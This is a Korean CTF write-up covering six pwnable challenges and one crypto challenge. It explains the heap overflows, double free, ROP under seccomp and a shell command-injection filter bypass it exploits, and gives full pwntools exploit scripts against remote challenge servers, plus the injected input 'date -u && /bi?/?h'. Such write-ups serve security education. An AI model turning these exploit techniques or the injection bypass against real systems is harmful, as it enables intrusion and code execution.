## Guess Me?  - Pwnable 100pt

/dev/urandom 에서 값을 가져온다음에 특정 계산을 한 다음 user가 입력한 값과 비교를 한다.
코드를 보면 v8 이 15가 되면 flag를 주는데, 비교하는 과정에서 for문을 15*15만큼 하기 때문에 “aaaaaaaaaaaaaaa”를 넣어준 뒤, 랜덤 값에서 a가 나올때까지 brute-force attack 해주면 된다.

```
v8 = 0;
  for ( j = 0; j <= 14; ++j )
  {
    for ( k = 0; k <= 14; ++k )
    {
      if ( v12[j] == s[k] )
        ++v8;
    }
  }
  printf("\nThis is my Password.\n=> %s\n", v12);
  if ( v8 != 15 )
  {
    puts("\nPasswords DO NOT match...\n");
    exit(0);
  }
  printf("\nCongrats! Here is flag.\n=> ");
  system("/bin/cat ./flag");
```

FLAG : If you have money, you do not have time. If you have time, you have no money. It is SO sad.

## friends - Pwnable 100pt
	
c++로 만들어진 바이너리였다. 대부분의 c++ 바이너리는 포인터를 조작해 프로그램 흐름을 조작하는 문제가 많은 것을 알고 있었기 때문에 이 부분을 생각하면서 문제를 풀었다.

```
if ( *(u_c + 8) > 0 )
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "Enter friend's index you want to meet : ");
    std::istream::operator>>(&std::cin, &v5);
    *(u_c + 9) = v5 - 1;
    std::operator<<<std::char_traits<char>>(&std::cout, "Enter friend's type you want to meet : ");
    std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, &v6);
    v2 = std::operator==<char,std::char_traits<char>,std::allocator<char>>(&v6, "Lion") && !*(u_c + 9);
    if ( v2 )
      Lion::sound(*(u_c + 1));
    v3 = std::operator<<<std::char_traits<char>>(&std::cout, "select friend.");
    std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  }
```

코드를 분석해보니 choose_friend 메뉴에서 friend’s type 입력창에 Lion을 입력하게 되면 포인터로 함수를 호출하는 것을 볼 수 있었고, 이 포인터를 make_friend Peach메뉴에서 조작할 수 있었다.

주어진 bonus 함수로 이 포인터를 조작하면 플래그를 얻을 수 있다.


```
from pwn import *

p = remote("13.209.132.255", 7979)
#p = process("./friends")
flag = 0x400FD6

p.sendlineafter(">> ","1")
p.sendlineafter(">> ","1")

p.sendlineafter("color?",p32(flag))
p.sendlineafter(">> ","2")

p.sendlineafter(": ","1")
p.sendlineafter(": ","Lion")
print p.recv()
```

FLAG : Talent wins gam3s, but teamwork wins champi0nships

## Gnote - Pwnable 200pt

바이너리를 보면 add, del, edit 메뉴들이 있다. 

add 메뉴에서는 stack주소와 heap주소를 주고 scanf로 chunk + 8 위치에 입력을 받고 있다. 이로 인해 heap overflow 취약점이 발생한다.

edit 메뉴에서는 edit하려고 하는 위치의 chunk가 add 메뉴로 인해 생성되어 졌는지 확인하고 get함수로 chunk + 8 위치에 입력을 받는다. 여기서도 heap overflow 취약점이 발생하는 것을 알 수 있다.

del 메뉴에선 free함수를 사용하지 않고 delete라는 직접 만든 함수를 사용하고 있다.

```
int __cdecl delete(int *chunk)
{
  int *v1; // ST18_4
  int v2; // ST1C_4

  if ( !chunk[1] || !*chunk )
    return puts("delete complete!");
  v1 = chunk[1];
  v2 = *chunk;
  *(v2 + 4) = v1;
  *v1 = v2;
  return puts("delete complete!");
}
```

입력은 chunk + 8 부분부터 받기 때문에 *chunk 와 *(chunk + 4) 에 값이 있는지 확인하고, 있다면 값이 있다면, (*chunk + 4) 의 값을 참조해서 *(chunk + 4) 의 값을 넣어주고 *(chunk + 4) 의 값을 참조해서 *chunk 값을 넣어준다.

앞서 add메뉴와 edit 메뉴에서 heap overflow가 일어나므로, 이 delete 함수를 이용해서 return address나 got를 overwrite해서 쉘 획득이 가능할 것이다. bonus 함수가 주어져있으므로 추가적인 Libc Leak은 필요 없을 것 같다.

```
from pwn import *

def add(num,data):
	p.sendlineafter("> ","1")
	p.recvuntil(": ")
	stack = int(p.recv(10),16)
	p.sendlineafter(") : ",str(num))
	p.sendlineafter(": ",data)
	return stack

def delete(num):
	p.sendline("2")
	p.sendlineafter(") : ",str(num))
	
def edit(num,data):
	p.sendlineafter("> ","3")
	p.sendlineafter(") : ",str(num))
	p.sendlineafter(": ",data)

p = remote("13.124.244.98",7777)
#p = process("./Gnote")
e = ELF("./Gnote")
context.log_level='debug'
bin_sh = 0x0804867B
A = 0x0804B084

stack = add(1,"a"*4)
stack = add(2,"a"*4)
edit(1,p32(0)*4+p32(stack+8)+p32(A))

delete(2)
edit(1,"A"*4+p32(bin_sh))

p.interactive()
```

FLAG : H1, I want 2 trav3l comf0rtably... bye, see u later…

## Auto_R0P - Pwnable 200pt

주어진 nc서버로 접속해보면 flag는 /flag안에 있고, binary가 base64로 encoding되어 있다고 알려준다. 처음에 풀 때는 이 binary가 고정인줄 알았는데, remote에서 계속 페이로드가 작동하지 않아서 문제 제목이 Auto_R0P인 것을 보고 그때서야 binary가 계속 바뀌는 것을 알 수 있었다.

주어진 binary를 base64 decoding한 뒤 바이너리를 보니 그냥 평범한 rop였다. 다만 문제점이 있다면 seccomp 함수를 이용해서 정해논 syscall이 외에 다른 syscall은 사용하지 못하게 해놓았다. 쓸 수 있는 syscall을 보니 open read write를 사용할 수 있었다. flag의 위치를 알고 있으므로 그냥 rop 해주면된다. 다만 주의할 점은 binary가 remote할 때마다 바뀌므로 bufsize와 gadget들의 위치를 구한다음에 동적으로 익스해주면된다.

python 의 subprocess 모듈을 이용해서 objdump와 같은 명령어들을 실행시켰다.

```
from pwn import *
import subprocess,base64

p = remote("13.209.132.255",8888)

def binary_make():
	p.recvuntil("[*] binary encoded with base64.\n")
	binary = p.recvuntil("\n").decode("base64")
	open("rop","w").write(binary)
	bufsize = subprocess.check_output("objdump -d ./rop -M intel | grep 'lea'",shell=True)
	prdi = subprocess.check_output("rp-lin-x64 -f ./rop -r 4 | grep 'pop rdi ;'",shell=True)
	prsir15 = subprocess.check_output("rp-lin-x64 -f ./rop -r 4 | grep 'pop rsi ; pop r15 ;'",shell=True)
	prdi = int(prdi[prdi.find("0x"):19],16)
	prsir15 = int(prsir15[prsir15.find("0x"):19],16)
	bufsize = bufsize[bufsize.find("0x"):]
	bufsize = int(bufsize[:bufsize.find("]")],16)
	return prdi,prsir15,bufsize

prdi,prsir15,bufsize = binary_make()

e = ELF("./rop")
payload = "a"*(bufsize)+"a"*8
payload += p64(prdi) + p64(0) + p64(prsir15)+p64(e.bss())+p64(0)+p64(e.plt['read'])
payload += p64(prdi)+p64(e.bss())+p64(prsir15)+p64(0)+p64(0) +p64(e.plt['open'])
payload += p64(prdi)+p64(3)+p64(prsir15)+p64(e.bss()+8)+p64(0)+p64(e.plt['read'])
payload += p64(prdi)+p64(1)+p64(e.plt['write'])

p.sendline(payload)
sleep(0.1)
p.sendline("/flag\x00")

print p.recvuntil("}")
```

FLAG : hello R0P W0rld !!! ~.~ Bye R0P W0rld !!!  :> No Pwn No Fun????

## CommandDate - Pwnable 100pt

```
====== Date Commander with Options ======

$ date -
```

주어진 nc서버로 접속하게되면 이런 화면이 뜨게 된다. 
저 화면을 보자마자 딱 떠오른건 이 문제는 shell cmd injection이고 
date명령어를 다른 명령어와 이용해서 flag를 얻어야 할 것 같았다.
명령어를 연결해서 사용할 수 있게 해주는 ';' 이나 '|' 는 막혀있고, '&'를 쓸 수 있었다. 

'&'는 ';' 과 '|' 와 다르게 앞 명령어의 실행결과가 오류가 없어야 했다.
따라서 date의 -u라는 옵션을 찾아냈고, 나머지 필터링들을 우회해서 
쉘을 얻은 뒤 flag를 읽었다.

```
====== Date Commander with Options ======

$ date -u && /bi?/?h

Sat Sep  1 10:44:40 UTC 2018
ls
CommandDate
flag
```

FLAG : AHAH AMPERS4ND C0MMAND INJECTION IS NOT COMM0N

## shoot - Crypto 100pt

iv 값을 seed를 초기화 하지 않고 랜덤값으로 주고 , Key값도 주길래 그냥 역연산코드를 짜주면 된다.

```
from Crypto.Cipher import AES
from Crypto import Random
import binascii,base64


BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

key = b'ThisisRealKey1:)'

iv = Random.new().read(AES.block_size)

cipher_text = "8dF1aL7GX2LTlg4C/tByA/KHg4L2zLMol86Zx7P1ZmbAnc8JCHU+BbBcx6zgb/M5LEA8BCPXHV6vW1SO9NeNyg=="
cipher_text = base64.b64decode(cipher_text)

cipher = AES.new(key,AES.MODE_CBC, iv)
plain_text = cipher.decrypt(iv+cipher_text)

print(plain_text)
```

FLAG : 50_45_l0ng_45_1_liv3_1'll_l0v3_y0u

## SavingProject - Pwnable 300pt

바이너리를 보면 deposit, withdraw, history, modify 메뉴가 있다.

deposit 메뉴를 보게 되면 32이하의 크기를 먼저 입력받고 malloc을 진행한다.
그다음 0x21만큼 buf에 입력받은 뒤 strlen으로 다시 크기를 측정한 뒤에
힙에 값을 넣어준다.

withdraw 메뉴는 그냥 선택한 인덱스에 할당되어 있는지 확인한 뒤에 free해준다.

modify 메뉴에서는 deposit 메뉴와 비슷하게 0x21만큼 buf에 입력받은 뒤 크기 측정후에 
힙에 값을 넣어준다.

history는 인덱스를 입력받고 인덱스에 해당하는 값을 출력해준다. 여기서 인덱스 검사를 따로 하지 않아서 oob가 터진다. 이걸로 스택, 라이브러리, 코드영역 주소가 Leak 가능하다.

이 문제에서는 free를 할 때나 malloc을 할 때 따로 공간을 초기화하지 않아서
double free와 free된 chunk의 fd 조작이 가능하다. 따라서 return address를 
system으로 바꾸어주면 플래그를 얻을 수 있다.

```
from pwn import *

p = remote("13.124.244.98",15927)
#p = process("./SavingProject")
e = ELF("./SavingProject")
context.log_level='debug'

def add(size,data):
   p.sendlineafter("> ","1")
   p.sendlineafter(": ",str(size))
   p.sendlineafter(": ",data)
   
def delete(idx):
   p.sendlineafter("> ","2")   
   p.sendlineafter(": ",str(idx))

def edit(idx,data):
   p.sendlineafter("> ","4")
   sleep(3)
   p.sendlineafter(": ",str(idx))
   p.sendlineafter(": ",data)

def show(idx):
   p.sendlineafter("> ","3")
   p.sendlineafter(": ",str(idx))
   p.recvuntil(":\n")
   p.recvuntil(": ")
   address = int(p.recvuntil("\n"),16)
   p.recvuntil(": ")
   data = p.recvuntil("\n")
   return address,data

#Libc Leak & Stack Leak
show(-9)
address,data = show(-9)
libc_base = address - 0x7a81b
system = libc_base +  0x45390

address,data = show(-5)
prev_size = address - 0x30

log.success("Found libc base! : 0x%x"%libc_base)

#Exploit
add(0x20,"A"*4)
add(0x20,"B"*4)

delete(1)
delete(2)
delete(1)

add(0x31,p64(prev_size))
add(0x31,"A"*4)
add(0x31,"B"*4)
add(0x31,"/bin/sh;"*3+p64(system))

p.interactive()
```

FLAG : The w0rld is a beautiful book, but 0f little u$e t0 him who cann0t r3ad it.




